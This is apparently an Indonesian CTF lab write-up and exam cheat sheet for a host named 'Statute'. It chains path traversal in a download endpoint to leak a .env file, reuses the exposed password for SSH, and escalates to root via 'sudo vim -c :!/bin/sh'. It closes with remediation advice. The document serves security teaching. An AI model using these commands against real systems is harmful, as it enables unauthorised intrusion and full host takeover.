# Write-Up Sederhana Statute: Path Traversal sampai Root

> **Target:** `192.168.56.120`  
> **Web:** `http://192.168.56.120:8080`  
> **Tujuan:** bahan belajar dan hafalan ujian closed book.  
> **Catatan:** hanya gunakan pada lab atau sistem yang memiliki izin pengujian.

---

## 1. Ringkasan

Server berhasil diambil alih melalui rangkaian berikut:

```text
Path Traversal
→ membaca file .env
→ mendapatkan username dan password
→ login SSH sebagai operator
→ menemukan sudo Vim
→ menjalankan shell dari Vim
→ root
```

Informasi penting:

```text
IP       : 192.168.56.120
Hostname : statute
Web Port : 8080
SSH Port : 22
User     : operator
Password : 0p3r470r@Jdih26
Privesc  : sudo vim
Final    : root
```

---

## 2. Reconnaissance

### Scan seluruh port

```bash
nmap -Pn -sC -sV -p- 192.168.56.120 -oA nmap-statute
```

Hasil penting:

```text
22/tcp   open  ssh   OpenSSH
80/tcp   open  http  Apache
8080/tcp open  http  Apache
```

### Kesimpulan

- Port `8080` menjalankan aplikasi web.
- Port `22` menjalankan SSH.
- SSH dapat menjadi jalur masuk jika ditemukan credential.

---

## 3. Directory Enumeration

```bash
dirsearch \
  -u http://192.168.56.120:8080 \
  -e php,html,txt,bak,old,zip,env
```

Hasil penting:

```text
/assets
/db.php
/documents
/download
/download.php
/files
/javascript
```

Endpoint yang paling menarik:

```text
/download
/download.php
```

Status `400` menunjukkan endpoint ada, tetapi membutuhkan parameter.

---

## 4. Membuat Baseline

Sebelum mencoba traversal, bandingkan request normal dan request file yang tidak ada.

### File valid

```bash
curl --path-as-is -i \
  "http://192.168.56.120:8080/download?file=perpres-10-2024.pdf"
```

Hasil:

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename="perpres-10-2024.pdf"
```

### File tidak ada

```bash
curl --path-as-is -i \
  "http://192.168.56.120:8080/download?file=missing.pdf"
```

Hasil:

```text
HTTP/1.1 404 Not Found
Berkas tidak ditemukan.
```

### Pelajaran

Baseline digunakan untuk membedakan:

```text
File valid     → 200
File tidak ada → 404
Traversal      → 200 dan isi file sensitif
```

---

## 5. Path Traversal

Coba naik satu direktori menggunakan:

```text
../
```

Request:

```bash
curl --path-as-is -i \
  -H "User-Agent: Mozilla/5.0" \
  "http://192.168.56.120:8080/download?file=../.env"
```

Hasil:

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=".env"

DB_USERNAME=operator
DB_PASSWORD=0p3r470r@Jdih26
DB_DATABASE=jdih
```

### Mengapa berhasil?

Kemungkinan aplikasi membuat path seperti berikut:

```text
direktori_files + input_user
```

Contoh:

```text
/var/www/app/files/ + ../.env
```

Menjadi:

```text
/var/www/app/.env
```

Aplikasi tidak memeriksa apakah file masih berada di dalam direktori download.

---

## 6. Analisis Credential

Credential yang ditemukan:

```text
Username : operator
Password : 0p3r470r@Jdih26
Database : jdih
```

Dari hasil Nmap diketahui port SSH terbuka:

```text
22/tcp open ssh
```

Maka credential dicoba pada SSH.

Pelajaran penting:

```text
Jangan melihat hasil tools secara terpisah.

Nmap menemukan SSH
+
Path traversal menemukan credential
=
Coba credential pada SSH
```

---

## 7. Initial Access melalui SSH

Login:

```bash
ssh operator@192.168.56.120
```

Masukkan password:

```text
0p3r470r@Jdih26
```

Pada koneksi pertama:

```text
Are you sure you want to continue connecting?
```

Jawab:

```text
yes
```

Setelah berhasil login, cek:

```bash
whoami
pwd
hostname
id
```

Hasil penting:

```text
operator
/home/operator
statute
```

Artinya kita sudah memperoleh shell sebagai user:

```text
operator
```

---

## 8. Membaca User Flag

```bash
ls -la
cat FLAG.txt
```

File flag berada di:

```text
/home/operator/FLAG.txt
```

Flag hanya digunakan sebagai bukti bahwa initial access berhasil.

---

## 9. Enumeration Privilege Escalation

Command pertama yang perlu dicoba:

```bash
sudo -l
```

Tujuan:

```text
Melihat command apa yang boleh dijalankan operator sebagai root.
```

Pada lab ini, user `operator` dapat menjalankan Vim melalui `sudo`.

Vim berbahaya jika dijalankan sebagai root karena dapat menjalankan command Linux.

---

## 10. Privilege Escalation melalui Vim

Jalankan:

```bash
sudo vim -c ':!/bin/sh'
```

Penjelasan:

```text
sudo        → menjalankan Vim dengan privilege root
vim         → text editor
-c          → menjalankan command Vim saat startup
:!          → menjalankan command sistem
/bin/sh     → membuka shell
```

Alurnya:

```text
operator
→ sudo menjalankan Vim sebagai root
→ Vim menjalankan /bin/sh
→ shell mewarisi privilege root
```

---

## 11. Validasi Root

Setelah shell terbuka:

```bash
whoami
id
```

Hasil:

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

Jika output menampilkan:

```text
uid=0(root)
```

maka privilege escalation berhasil.

---

## 12. Keluar dari Root Shell

Keluar dari shell:

```bash
exit
```

Kemudian keluar dari Vim:

```vim
:q!
```

---

## 13. Attack Chain Lengkap

```text
1. Scan port
   nmap -Pn -sC -sV -p- 192.168.56.120

2. Cari direktori
   dirsearch -u http://192.168.56.120:8080

3. Temukan endpoint
   /download?file=

4. Uji baseline
   file valid   → 200
   missing.pdf  → 404

5. Path traversal
   /download?file=../.env

6. Credential
   operator
   0p3r470r@Jdih26

7. Login SSH
   ssh operator@192.168.56.120

8. Enumerasi sudo
   sudo -l

9. Privilege escalation
   sudo vim -c ':!/bin/sh'

10. Root proof
    whoami
    id
```

---

## 14. Command Hafalan Closed Book

```bash
# 1. Scan
nmap -Pn -sC -sV -p- 192.168.56.120

# 2. Enumerasi web
dirsearch -u http://192.168.56.120:8080 -e php,html,txt,env

# 3. Path traversal
curl --path-as-is -i \
"http://192.168.56.120:8080/download?file=../.env"

# 4. SSH
ssh operator@192.168.56.120

# Password
0p3r470r@Jdih26

# 5. Enumerasi privilege
sudo -l

# 6. Root
sudo vim -c ':!/bin/sh'

# 7. Validasi
whoami
id
```

Rumus hafalan:

```text
NMAP → DIR → TRAVERSAL → ENV → SSH → SUDO VIM → ROOT
```

---

## 15. Kesalahan Konfigurasi

Terdapat tiga kelemahan utama.

### A. Path Traversal

Endpoint download menerima:

```text
../.env
```

Aplikasi dapat membaca file di luar direktori download.

### B. Credential Reuse

Password dari `.env` juga dapat digunakan untuk akun SSH:

```text
operator / 0p3r470r@Jdih26
```

### C. Sudo Vim

User `operator` dapat menjalankan Vim sebagai root.

Karena Vim dapat menjalankan:

```vim
:!/bin/sh
```

maka user memperoleh shell root.

---

## 16. Dampak

Setelah menjadi root, attacker dapat:

```text
Membaca seluruh file
Mengambil credential user lain
Mengubah aplikasi
Mengubah konfigurasi server
Membuat user baru
Memasang persistence
Menghapus log
Mengambil alih penuh host
```

Severity:

```text
Critical
```

---

## 17. Rekomendasi Singkat

### Perbaiki endpoint download

- Jangan menerima path langsung dari user.
- Gunakan ID dokumen.
- Gunakan `realpath()`.
- Pastikan resolved path tetap berada di direktori dokumen.
- Tolak karakter traversal seperti `../`.

### Ganti credential

Segera ganti:

```text
Password database
Password user operator
Credential lain di .env
```

### Hindari password reuse

Gunakan password berbeda untuk:

```text
Database
SSH
Aplikasi
Administrator
```

### Perbaiki sudoers

Hapus akses:

```text
sudo vim
```

Gunakan `sudoedit` jika user hanya perlu mengedit file tertentu.

---

## 18. Lesson Learned

1. Temuan kecil dapat menjadi awal kompromi besar.
2. Path traversal tidak langsung root, tetapi dapat membuka credential.
3. Hasil Nmap harus dihubungkan dengan hasil web testing.
4. Password database dapat dicoba pada service lain jika ada indikasi reuse.
5. Setelah mendapat shell, jalankan `sudo -l`.
6. Editor seperti Vim dapat memiliki shell escape.
7. Selalu validasi dengan `whoami` dan `id`.
8. Jangan langsung menggunakan exploit kernel jika ada misconfiguration yang lebih sederhana.

---

## 19. Kesimpulan

Akses awal diperoleh melalui path traversal pada endpoint:

```text
/download?file=../.env
```

File `.env` mengungkap:

```text
DB_USERNAME=operator
DB_PASSWORD=0p3r470r@Jdih26
DB_DATABASE=jdih
```

Credential tersebut berhasil digunakan untuk login SSH:

```bash
ssh operator@192.168.56.120
```

Setelah login sebagai `operator`, ditemukan bahwa Vim dapat dijalankan melalui sudo.

Command:

```bash
sudo vim -c ':!/bin/sh'
```

membuka shell dengan privilege root.

Validasi:

```bash
whoami
id
```

menghasilkan:

```text
root
uid=0(root)
```

Attack chain final:

```text
Path Traversal
→ .env Disclosure
→ Credential Reuse
→ SSH sebagai operator
→ Sudo Vim
→ Root
```
